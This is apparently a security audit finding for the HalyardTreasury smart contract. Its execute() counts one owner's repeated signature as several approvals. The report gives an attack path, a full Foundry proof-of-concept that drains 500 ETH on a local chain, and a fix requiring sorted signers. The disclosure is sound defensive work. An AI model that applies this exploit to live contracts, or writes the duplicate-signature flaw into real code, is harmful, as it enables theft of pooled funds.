# execute() counts a repeated signature as a new approval, so one owner moves the whole treasury

Severity: Critical
Impact: Execution of a treasury transaction approved by fewer than `threshold` distinct owners
Asset: src/HalyardTreasury.sol, release v2.0.1

## Summary

`HalyardTreasury.execute()` adds one approval for every signature that recovers to an owner. It never checks that the signers differ. One owner signs a transaction once, submits that signature `threshold` times and the treasury executes it. In the proof a single key of a 3-of-5 treasury sends all 500 ETH to an address of its choice.

## Root cause

`src/HalyardTreasury.sol:76-81`

```solidity
uint256 approvals;
for (uint256 i = 0; i < signatures.length; i++) {
    address signer = _recover(digest, signatures[i]);
    if (isOwner[signer]) approvals++;
}
if (approvals < threshold) revert NotEnoughApprovals(approvals, threshold);
```

The NatSpec on line 69 asks for signatures "sorted by owner address". Nothing enforces it: there is no ordering check, no seen-set and no comparison with the previous signer. `_recover()` (lines 91-100) rejects malformed and malleable signatures, which does not stop the same valid signature from being supplied again.

## Attack path

1. The treasury is 3-of-5 and holds 500 ETH. Mallory is one of the five owners.
2. Mallory reads `nonce` and signs `txDigest(recipient, 500 ether, "", nonce)` with her own key. One signature.
3. Anyone calls `execute(recipient, 500 ether, "", [sig, sig, sig])`. `execute()` has no caller check.
4. The loop on lines 77-80 recovers Mallory three times and sets `approvals` to 3. Line 81 passes.
5. Line 87 sends 500 ETH to `recipient`.

## Proof of concept

`test/DuplicateSignature.t.sol`, run on release v2.0.1 with Foundry. Local deployment, no mocks: the test deploys the production contract with five owners and threshold 3, and signs with one owner key.

```
forge test --match-contract DuplicateSignatureTest -vv
```

The whole test file:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {HalyardTreasury} from "../src/HalyardTreasury.sol";

contract DuplicateSignatureTest is Test {
    HalyardTreasury internal treasury;

    address internal mallory;
    uint256 internal malloryKey;
    address internal recipient = makeAddr("recipient");

    function setUp() public {
        (mallory, malloryKey) = makeAddrAndKey("mallory");

        address[] memory owners = new address[](5);
        owners[0] = mallory;
        owners[1] = makeAddr("owner-2");
        owners[2] = makeAddr("owner-3");
        owners[3] = makeAddr("owner-4");
        owners[4] = makeAddr("owner-5");

        // A 3-of-5 treasury holding 500 ETH.
        treasury = new HalyardTreasury(owners, 3);
        vm.deal(address(treasury), 500 ether);
    }

    function _sign(address to, uint256 value) internal view returns (bytes memory) {
        bytes32 digest = treasury.txDigest(to, value, "", treasury.nonce());
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(malloryKey, digest);
        return abi.encodePacked(r, s, v);
    }

    /// Control: one signature, sent once, is refused.
    function test_control_oneSignatureIsRefused() public {
        bytes[] memory signatures = new bytes[](1);
        signatures[0] = _sign(recipient, 500 ether);

        vm.expectRevert(abi.encodeWithSelector(HalyardTreasury.NotEnoughApprovals.selector, 1, 3));
        treasury.execute(recipient, 500 ether, "", signatures);

        assertEq(address(treasury).balance, 500 ether);
    }

    /// The same signature, sent three times, passes the 3-of-5 check.
    function test_oneOwnerEmptiesTreasuryWithRepeatedSignature() public {
        assertEq(treasury.threshold(), 3);
        assertEq(address(treasury).balance, 500 ether);
        assertEq(recipient.balance, 0);

        bytes memory signature = _sign(recipient, 500 ether);
        bytes[] memory signatures = new bytes[](3);
        signatures[0] = signature;
        signatures[1] = signature;
        signatures[2] = signature;

        // Anyone can submit: execute() has no caller check.
        vm.prank(makeAddr("relayer"));
        treasury.execute(recipient, 500 ether, "", signatures);

        console2.log("treasury balance after (wei)", address(treasury).balance);
        console2.log("recipient balance after (ETH)", recipient.balance / 1 ether);

        assertEq(address(treasury).balance, 0);
        assertEq(recipient.balance, 500 ether);
        assertEq(treasury.nonce(), 1);
        assertEq(treasury.threshold(), 3);
    }
}
```

```
Ran 2 tests for test/DuplicateSignature.t.sol:DuplicateSignatureTest
[PASS] test_control_oneSignatureIsRefused() (gas: 40464)
[PASS] test_oneOwnerEmptiesTreasuryWithRepeatedSignature() (gas: 122051)
Logs:
  treasury balance after (wei) 0
  recipient balance after (ETH) 500

Suite result: ok. 2 passed; 0 failed; 0 skipped
```

The control test sends the same signature once and gets `NotEnoughApprovals(1, 3)`, so the check itself works and only the count is wrong.

With the fix below applied to a local copy of release v2.0.1, the same command fails where it should:

```
[PASS] test_control_oneSignatureIsRefused() (gas: 40502)
[FAIL: SignersNotSorted()] test_oneOwnerEmptiesTreasuryWithRepeatedSignature() (gas: 50120)
```

## Impact

Critical: "Execution of a treasury transaction approved by fewer than `threshold` distinct owners." The treasury's stated guarantee (lines 8-9) is that no transaction executes with approvals from fewer than `threshold` distinct owners. One owner key is enough to execute any call with any value, so the loss is the full balance: 500 ETH in the proof. The same path lets that owner call `addOwner`, `removeOwner` and `setThreshold` through the treasury itself.

## Limits

- The attacker needs one valid owner signature. An account that is not an owner gains nothing: its signatures add no approvals (line 79).
- One signature authorises one transaction. The nonce on line 84 still prevents replaying it.
- Not tested: a fork of a live deployment. The proof runs the production contract on a local chain with the 3-of-5 configuration.

## Nearest known issue

KI-1 in `docs/known-issues.md` describes a treasury that owners have voted down to threshold 1. That needs `threshold` owners to approve `setThreshold` first. Here the threshold stays at 3 (asserted in the test) and is bypassed. KI-2 concerns `removeOwner` and freezing, not signature counting.

## Fix

Require strictly ascending signer addresses, which rejects duplicates and enforces the order the NatSpec already asks for:

```solidity
error SignersNotSorted();

// in execute():
address last;
for (uint256 i = 0; i < signatures.length; i++) {
    address signer = _recover(digest, signatures[i]);
    if (signer <= last) revert SignersNotSorted();
    last = signer;
    if (isOwner[signer]) approvals++;
}
```
